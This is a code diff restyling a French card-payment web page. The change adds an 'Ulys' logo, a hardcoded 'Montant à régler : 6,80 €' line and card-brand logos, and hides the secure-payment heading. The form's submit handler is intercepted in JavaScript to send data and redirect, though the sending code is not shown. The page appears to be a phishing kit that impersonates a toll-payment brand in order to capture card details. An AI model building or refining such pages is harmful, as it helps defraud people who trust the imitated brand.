@@ -43,15 +43,36 @@
     }
 
     .card {
-      max-width: 480px;
-      margin: 0 auto;
-      padding: 2rem;
+      max-width: 650px;
+      margin: 2rem auto;
+      padding: 2.5rem;
+      background-color: #fff;
+      border-radius: 20px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .form-logo-center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    .form-logo-center img {
+      height: 55px;
+      object-fit: contain;
+    }
+
+    .amount-text {
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 2rem;
     }
 
     h1 {
-      color: #1a1a1a;
-      text-align: center;
-      margin-bottom: 1.5rem;
+      display: none;
     }
 
     .header-toggle button {
@@ -78,7 +99,11 @@
 
   <main class="container">
     <div class="card">
-      <h1>Paiement sécurisé</h1>
+      <div class="form-logo-center">
+        <img src="assets/images/logo-ulys2.png" alt="Ulys">
+      </div>
+
+      <div class="amount-text">Montant à régler : 6,80 €</div>
 
       <div class="accepted-logos">
         <img src="assets/images/visa.png" alt="Visa">
@@ -111,13 +136,11 @@
   </footer>
 
   <script>
-    // Gestion du toggle Particulier / Professionnel
     function toggleUserType(button) {
       document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
       button.classList.add("active");
     }
 
-    // Envoi des données et redirection
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
